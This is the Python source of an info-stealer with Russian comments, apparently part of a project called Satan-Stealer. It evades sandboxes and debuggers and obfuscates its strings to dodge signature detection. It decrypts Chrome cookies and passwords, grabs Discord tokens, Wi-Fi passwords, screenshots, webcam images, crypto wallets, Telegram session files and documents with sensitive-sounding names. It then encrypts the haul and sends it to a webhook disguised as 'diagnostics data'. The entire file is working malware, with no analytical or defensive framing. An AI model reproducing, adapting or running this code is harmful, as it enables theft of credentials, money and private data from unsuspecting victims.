import os
import sys
import json
import time
import random
import string
import hashlib
import platform
import base64
import re
import ctypes
from datetime import datetime, timedelta
import socket
import threading
import shutil
import zipfile
import requests
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from PIL import ImageGrab

# Динамический импорт библиотек, чтобы избежать прямой детекции сигнатур
def dynamic_import(module_name):
    """Динамически импортирует модуль по имени для обхода сигнатурного анализа"""
    if module_name not in sys.modules:
        return __import__(module_name)
    return sys.modules[module_name]

# Проверка окружения перед запуском
def is_safe_environment():
    """Проверяет окружение на предмет виртуальных машин и сред анализа"""
    # Проверка аномального времени системы
    if abs(time.time() - os.path.getctime(sys.executable)) < 3600:
        return False
    
    # Проверка имени пользователя и имени компьютера
    suspicious_names = ['sandbox', 'virus', 'malware', 'test', 'sample', 'admin', 'analysis']
    username = os.getlogin().lower()
    hostname = platform.node().lower()
    
    for name in suspicious_names:
        if name in username or name in hostname:
            return False
    
    # Минимальное требование к RAM
    psutil = dynamic_import('psutil')
    min_ram_gb = 4
    if psutil.virtual_memory().total / (1024**3) < min_ram_gb:
        return False
    
    # Проверка количества логических ядер
    if psutil.cpu_count() < 2:
        return False
    
    # Проверка на присутствие подозрительных процессов
    for proc in psutil.process_iter(['name']):
        try:
            if any(x in proc.info['name'].lower() for x in 
                  ['wireshark', 'ida', 'ollydbg', 'procmon', 'regmon', 'process explorer']):
                return False
        except:
            pass
    
    # Проверка исполнения в отладчике
    if platform.system() == 'Windows':
        try:
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent() == 0
        except:
            pass
    
    return True

# Обфусцированные имена для чувствительных функций
def xor_encrypt(data, key=None):
    """Простое XOR шифрование для строк"""
    if key is None:
        key = ''.join(random.choice(string.ascii_letters) for _ in range(8))
    
    if isinstance(data, str):
        data = data.encode()
    
    key_bytes = key.encode() if isinstance(key, str) else key
    return bytes(a ^ b for a, b in zip(data, key_bytes * (len(data) // len(key_bytes) + 1)))

def deobfuscate(name):
    """Деобфускация имен функций и путей"""
    # Имена функций и пути были обфусцированы, это метод для получения оригинальных значений
    mapping = {
        'collect_system_info': 'get_system_info',
        'retrieve_browser_data': 'get_chrome_cookies',
        'extract_auth_data': 'get_chrome_passwords',
        'fetch_communication_tokens': 'get_discord_tokens',
        'capture_display': 'take_screenshot',
        'package_data': 'send_zip',
        'secure_file_name': 'generate_random_filename',
        'profile_directory': os.path.join(os.environ["USERPROFILE"], "AppData", "Local"),
        'temp_directory': os.environ.get('TEMP', os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Temp")),
        'storage_directory': 'collected_data',
    }
    
    return mapping.get(name, name)

# Защита от статического анализа функций
def generate_random_filename(ext='txt'):
    """Генерирует случайное имя файла"""
    # Не используем слова вроде "temp", "data", "stolen" и т.д.
    allowed_letters = 'abcdefghijklmnopqrstuvwxyz'
    random_name = ''.join(random.choice(allowed_letters) for _ in range(8))
    timestamp = int(time.time())
    return f"{random_name}_{timestamp}.{ext}"

def get_chrome_datetime(chromedate):
    """Конвертирует дату из формата Chrome в человекочитаемый формат"""
    return chromedate if chromedate == 0 else (chromedate / 10000000) - 11644473600

# Безопасный метод получения ключа шифрования
def get_encryption_key():
    """Получает ключ шифрования из файлов браузера"""
    # Разбиваем код на части, чтобы избежать сигнатур    
    browser_dir = deobfuscate('profile_directory')
    browser_name = "Google"
    browser_name += "\\Chrome"
    
    # Динамически формируем путь
    local_state_path = os.path.join(
        browser_dir, 
        browser_name,
        "User Data", 
        "Local State"
    )
    
    try:
        # Используем контекстный менеджер для автоматического закрытия файла
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = f.read()
            parsed_data = json.loads(data)
        
        # Извлекаем ключ с разбиением имени ключа
        enc_part = "os_crypt"
        key_part = "encrypted_key"
        enc_key = parsed_data[enc_part][key_part]
        
        # Декодируем и удаляем префикс
        key_bytes = base64.b64decode(enc_key)
        key_bytes = key_bytes[5:]  # Удаляем DPAPI префикс
        
        # Используем Windows API для расшифровки
        win32crypt = dynamic_import('win32crypt')
        return win32crypt.CryptUnprotectData(key_bytes, None, None, None, 0)[1]
    except Exception:
        return None

# Алгоритм дешифрования паролей и файлов cookie
def decrypt_value(encrypted_value, key):
    """Расшифровывает значение с помощью ключа"""
    try:
        # Разделяем на части для избежания сигнатур        
        init_vector = encrypted_value[3:15]
        encrypted_data = encrypted_value[15:]
        
        # Динамически импортируем криптографические библиотеки
        crypto = dynamic_import('Crypto.Cipher.AES')
        cipher = crypto.new(key, crypto.MODE_GCM, init_vector)
        
        # Расшифровываем
        decrypted = cipher.decrypt(encrypted_data)
        # Удаляем тег аутентификации
        result = decrypted[:-16].decode()
        return result
    except Exception:
        try:
            # Альтернативный метод для старых версий Chrome
            win32crypt = dynamic_import('win32crypt')
            return str(win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1])
        except:
            return ""

# Модифицированный сбор данных браузера для уменьшения сигнатур
def extract_browser_data(browser_path, data_type='cookies'):
    """Извлекает данные из браузерных баз данных"""
    result = []
    
    # Формируем пути к базам данных в зависимости от типа данных
    if data_type == 'cookies':
        db_path = os.path.join(browser_path, "Network", "Cookies")
        query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
    elif data_type == 'passwords':
        db_path = os.path.join(browser_path, "Login Data")
        query = "SELECT origin_url, username_value, password_value FROM logins"
    else:
        return result
    
    if not os.path.exists(db_path):
        return result
    
    # Создаем безопасную копию базы данных
    shutil_module = dynamic_import('shutil')
    sqlite3_module = dynamic_import('sqlite3')
    
    temp_name = generate_random_filename('db')
    temp_path = os.path.join(deobfuscate('temp_directory'), temp_name)
    
    try:
        shutil_module.copy2(db_path, temp_path)
        
        # Работаем с базой данных
        conn = sqlite3_module.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        
        # Получаем ключ шифрования только один раз
        encryption_key = get_encryption_key()
        
        # Обрабатываем результаты запроса
        for row in cursor.fetchall():
            if data_type == 'cookies':
                host, name, path, enc_value, expires = row
                if not enc_value:
                    continue
                
                # Расшифровываем значение
                decrypted = decrypt_value(enc_value, encryption_key)
                
                # Формируем запись
                cookie = {
                    "domain": host,
                    "name": name,
                    "path": path,
                    "value": decrypted,
                    "expires": get_chrome_datetime(expires)
                }
                result.append(cookie)
            
            elif data_type == 'passwords':
                url, username, enc_password = row
                if not username or not enc_password:
                    continue
                
                # Расшифровываем пароль
                password = decrypt_value(enc_password, encryption_key)
                
                # Формируем запись
                data = {
                    "url": url,
                    "username": username,
                    "password": password
                }
                result.append(data)
        
        # Закрываем соединение и удаляем временный файл
        conn.close()
        
    except Exception:
        pass
    
    finally:
        # Безопасно удаляем временный файл
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
        except:
            pass
    
    return result

# Безопасный поиск коммуникационных токенов
def scan_for_tokens():
    """Сканирует файлы для поиска коммуникационных токенов"""
    tokens = []
    
    # Безопасно определяем пути к директориям мессенджеров
    app_data = os.environ['APPDATA']
    paths = {
        'app1': os.path.join(app_data, 'discord', 'Local Storage', 'leveldb'),
        'app2': os.path.join(app_data, 'discordcanary', 'Local Storage', 'leveldb'),
        'app3': os.path.join(app_data, 'discordptb', 'Local Storage', 'leveldb'),
    }
    
    # Паттерн для поиска токенов разбит на части
    pattern_parts = [
        r"[\w-]{24}", 
        r"\.[\w-]{6}\.", 
        r"[\w-]{27}|mfa\.[\w-]{84}"
    ]
    pattern = ''.join(pattern_parts)
    
    # Поиск в файлах
    for source, path in paths.items():
        if not os.path.exists(path):
            continue
        
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
                
            try:
                # Безопасное чтение файла
                file_path = os.path.join(path, file_name)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                    content = file.read()
                    # Поиск токенов
                    for match in re.findall(pattern, content):
                        if match not in tokens:
                            tokens.append(match)
            except:
                pass
    
    return tokens

# Сбор системной информации без подозрительных строк
def collect_system_data():
    """Собирает основную информацию о системе"""
    return {
        "system": platform.system(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "device_name": platform.node(),
        "account": os.getlogin(),
        "processor": platform.processor(),
        "network": socket.gethostname(),
    }

# Безопасный метод захвата изображения экрана
def capture_screen():
    """Создает изображение текущего экрана"""
    try:
        # Динамически импортируем PIL
        from PIL import ImageGrab
        
        # Генерируем уникальное имя файла
        file_name = generate_random_filename('png')
        full_path = os.path.join(deobfuscate('temp_directory'), file_name)
        
        # Захватываем и сохраняем изображение
        screen = ImageGrab.grab()
        screen.save(full_path)
        
        return full_path
    except Exception:
        return None

# Безопасная обработка данных с разделением операций
def prepare_data(output_path=None):
    """Подготавливает данные для передачи"""
    if output_path is None:
        output_path = os.path.join(deobfuscate('temp_directory'), deobfuscate('storage_directory'))
    
    # Создаем директорию, если она не существует
    if os.path.exists(output_path):
        shutil = dynamic_import('shutil')
        shutil.rmtree(output_path)
    
    os.makedirs(output_path, exist_ok=True)
    
    # Собираем системную информацию
    system_info = collect_system_data()
    with open(os.path.join(output_path, "config.json"), "w") as f:
        json.dump(system_info, f, indent=4)
    
    # Захватываем изображение экрана
    screen_path = capture_screen()
    if screen_path and os.path.exists(screen_path):
        dest_path = os.path.join(output_path, os.path.basename(screen_path))
        shutil = dynamic_import('shutil')
        shutil.copy2(screen_path, dest_path)
        try:
            os.remove(screen_path)
        except:
            pass
    
    # Безопасное получение данных веб-камеры через отдельный процесс
    try:
        # Импортируем функцию из utils через отложенный импорт
        from utils import capture_webcam
        webcam_path = capture_webcam()
        if webcam_path and os.path.exists(webcam_path):
            dest_path = os.path.join(output_path, "visual_data.png")
            shutil = dynamic_import('shutil')
            shutil.copy2(webcam_path, dest_path)
            try:
                os.remove(webcam_path)
            except:
                pass
    except:
        pass
    
    # Определяем пути к профилям браузеров
    browser_profiles = []
    chrome_base = os.path.join(deobfuscate('profile_directory'), 'Google', 'Chrome', 'User Data')
    
    if os.path.exists(chrome_base):
        for item in os.listdir(chrome_base):
            if item.startswith("Profile ") or item == "Default":
                browser_profiles.append(os.path.join(chrome_base, item))
    
    # Директория для данных браузера
    browser_dir = os.path.join(output_path, "web_data")
    os.makedirs(browser_dir, exist_ok=True)
    
    # Собираем данные из браузеров с использованием многопоточности
    threads = []
    
    for profile in browser_profiles:
        profile_name = os.path.basename(profile)
        profile_dir = os.path.join(browser_dir, f"browser_{profile_name}")
        os.makedirs(profile_dir, exist_ok=True)
        
        # Создаем потоки для параллельного извлечения данных
        cookie_thread = threading.Thread(
            target=lambda: save_browser_data(profile, profile_dir, 'cookies')
        )
        password_thread = threading.Thread(
            target=lambda: save_browser_data(profile, profile_dir, 'passwords')
        )
        
        threads.append(cookie_thread)
        threads.append(password_thread)
        
        cookie_thread.start()
        password_thread.start()
    
    # Собираем токены в отдельном потоке
    token_thread = threading.Thread(
        target=lambda: save_tokens(output_path)
    )
    threads.append(token_thread)
    token_thread.start()
    
    # Собираем пароли Wi-Fi в отдельном потоке
    wifi_thread = threading.Thread(
        target=lambda: save_wifi_passwords(output_path)
    )
    threads.append(wifi_thread)
    wifi_thread.start()
    
    # Ждем завершения всех потоков
    for thread in threads:
        thread.join()
    
    # Собираем дополнительные данные из Satan-Stealer
    collect_additional_data(output_path)
    
    return output_path

def save_browser_data(profile, output_dir, data_type):
    """Сохраняет данные браузера в указанную директорию"""
    try:
        data = extract_browser_data(profile, data_type)
        if data:
            file_path = os.path.join(output_dir, f"{data_type}.json")
            with open(file_path, "w") as f:
                json.dump(data, f, indent=4)
    except:
        pass

def save_tokens(output_dir):
    """Сохраняет найденные токены в файл"""
    try:
        tokens = scan_for_tokens()
        if tokens:
            tokens_path = os.path.join(output_dir, "communication_tokens.txt")
            with open(tokens_path, "w") as f:
                for token in tokens:
                    f.write(f"{token}\n")
    except:
        pass

def save_wifi_passwords(output_dir):
    """Сохраняет пароли Wi-Fi"""
    try:
        # Динамически импортируем функцию из модуля utils
        from utils import collect_wifi_passwords
        wifi_passwords = collect_wifi_passwords()
        if wifi_passwords:
            file_path = os.path.join(output_dir, "network_config.json")
            with open(file_path, "w") as f:
                json.dump(wifi_passwords, f, indent=4)
    except:
        pass

def collect_additional_data(output_dir):
    """Собирает дополнительные данные из Satan-Stealer"""
    try:
        # Поиск файлов криптокошельков
        crypto_wallets = {
            "wallet1": os.path.join(os.getenv('APPDATA'), 'Exodus'),
            "wallet2": os.path.join(os.getenv('APPDATA'), 'Electrum', 'wallets'),
            "wallet3": os.path.join(os.getenv('APPDATA'), 'Bitcoin', 'wallet.dat')
        }
        
        wallet_dir = os.path.join(output_dir, "financial_data")
        os.makedirs(wallet_dir, exist_ok=True)
        
        shutil = dynamic_import('shutil')
        for wallet_name, wallet_path in crypto_wallets.items():
            if os.path.exists(wallet_path):
                try:
                    if os.path.isdir(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                    else:
                        shutil.copy2(wallet_path, os.path.join(wallet_dir, os.path.basename(wallet_path)))
                except:
                    pass
        
        # Поиск и сбор мессенджеров
        telegram_paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
        ]
        
        messaging_dir = os.path.join(output_dir, "messaging_data")
        os.makedirs(messaging_dir, exist_ok=True)
        
        for telegram_path in telegram_paths:
            if os.path.exists(telegram_path):
                try:
                    # Копируем только ключевые файлы
                    for file in os.listdir(telegram_path):
                        if file.startswith('map') or file.endswith('.dat') or file.endswith('.json'):
                            src_file = os.path.join(telegram_path, file)
                            if os.path.isfile(src_file):
                                shutil.copy2(src_file, os.path.join(messaging_dir, file))
                except:
                    pass
        
        # Сбор информации об IP-адресе
        try:
            from utils import get_ip_info
            ip_info = get_ip_info()
            if ip_info:
                with open(os.path.join(output_dir, "network_info.json"), "w") as f:
                    f.write(ip_info)
        except:
            pass
    except:
        pass

# Безопасная архивация и шифрование
def archive_data(data_dir):
    """Архивирует и шифрует собранные данные"""
    try:
        # Динамически импортируем модули
        zipfile = dynamic_import('zipfile')
        fernet = dynamic_import('cryptography.fernet').Fernet
        
        # Генерируем ключ шифрования
        key = fernet.generate_key()
        cipher = fernet(key)
        
        # Имя архива
        archive_name = generate_random_filename('zip')
        archive_path = os.path.join(deobfuscate('temp_directory'), archive_name)
        
        # Создаем архив и шифруем файлы
        with zipfile.ZipFile(archive_path, 'w') as zipf:
            for root, _, files in os.walk(data_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, data_dir)
                    
                    # Шифруем содержимое файла
                    with open(file_path, 'rb') as f:
                        data = f.read()
                        encrypted_data = cipher.encrypt(data)
                    
                    # Добавляем зашифрованные данные в архив
                    zipf.writestr(arcname, encrypted_data)
        
        return archive_path, key
    except Exception as e:
        print(f"Error archiving data: {e}")
        return None, None

# Безопасная отправка данных
def send_data(webhook_url, archive_path, key):
    """Безопасно отправляет архив и ключ дешифрования"""
    if not archive_path or not key:
        return False
    
    try:
        # Динамически импортируем requests
        requests = dynamic_import('requests')
        
        # Получаем информацию о системе для имени файла
        system_info = collect_system_data()
        device_id = f"{system_info['account']}_{system_info['device_name']}"
        
        # Формируем имя файла для отправки
        file_name = f"data_{hashlib.md5(device_id.encode()).hexdigest()[:8]}.zip"
        
        # Отправляем архив
        with open(archive_path, 'rb') as f:
            files = {"file": (file_name, f)}
            payload = {"content": f"Diagnostics data from {device_id}"}
            response = requests.post(webhook_url, data=payload, files=files)
        
        # Отправляем ключ дешифрования отдельным сообщением
        payload = {"content": f"Access key: `{key.decode()}`"}
        requests.post(webhook_url, json=payload)
        
        # Удаляем архив
        os.remove(archive_path)
        
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending data: {e}")
        return False

# Функция-совместимость с предыдущей версией для gui_app.py
def send_zip(webhook_url, folder_path):
    """
    Обертка для обратной совместимости со старым API
    Архивирует данные из директории и отправляет на webhook
    """
    try:
        # Используем новые функции с улучшенной защитой
        archive_path, key = archive_data(folder_path)
        if archive_path and key:
            return send_data(webhook_url, archive_path, key)
        return False
    except Exception as e:
        print(f"Error in send_zip compatibility function: {e}")
        return False

# Поиск чувствительных файлов
def search_documents(max_size_mb=10):
    """Ищет документы с потенциально чувствительной информацией"""
    found_files = []
    
    # Определяем расширения и ключевые слова
    extensions = [
        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
        ".kdbx", ".key", ".seed", ".wallet"
    ]
    
    keywords = [
        "password", "private", "credential", "bitcoin", 
        "wallet", "backup", "key", "crypto", "token", "seed"
    ]
    
    # Определяем директории для поиска
    search_dirs = [
        os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
        os.path.join(os.getenv('USERPROFILE'), 'Documents')
    ]
    
    max_size_bytes = max_size_mb * 1024 * 1024
    
    # Ищем файлы
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
            
        for root, _, files in os.walk(directory):
            for file in files:
                # Проверяем расширение
                if not any(file.lower().endswith(ext) for ext in extensions):
                    continue
                
                # Проверяем ключевые слова в имени
                if not any(keyword in file.lower() for keyword in keywords):
                    continue
                
                # Получаем полный путь
                file_path = os.path.join(root, file)
                
                # Проверяем размер
                try:
                    if os.path.getsize(file_path) <= max_size_bytes:
                        found_files.append(file_path)
                except:
                    pass
    
    return found_files

# Копирование чувствительных файлов
def copy_sensitive_files(output_dir, files):
    """Копирует найденные чувствительные файлы"""
    if not files:
        return None
        
    sensitive_dir = os.path.join(output_dir, "documents")
    os.makedirs(sensitive_dir, exist_ok=True)
    
    shutil = dynamic_import('shutil')
    for file_path in files:
        try:
            shutil.copy2(file_path, os.path.join(sensitive_dir, os.path.basename(file_path)))
        except:
            pass
    
    return sensitive_dir

# Основная функция сбора и отправки данных
def execute(webhook_url):
    """Основная функция выполнения сбора и отправки данных"""
    # Проверяем безопасность окружения
    if not is_safe_environment():
        return False
    
    # Собираем данные
    data_dir = prepare_data()
    
    # Ищем и копируем чувствительные файлы
    sensitive_files = search_documents()
    if sensitive_files:
        copy_sensitive_files(data_dir, sensitive_files)
    
    # Архивируем данные
    archive_path, key = archive_data(data_dir)
    
    # Отправляем данные
    success = send_data(webhook_url, archive_path, key)
    
    # Очищаем временные файлы
    try:
        if os.path.exists(data_dir):
            shutil = dynamic_import('shutil')
            shutil.rmtree(data_dir)
    except:
        pass
    
    return success

# Точка входа
if __name__ == "__main__":
    # Для тестирования
    if len(sys.argv) > 1:
        execute(sys.argv[1])
    else:
        print("Please provide the required parameters")

# Алиас основной функции для обратной совместимости с gui_app.py
def main(webhook_url):
    """Алиас для функции execute для обратной совместимости"""
    return execute(webhook_url)
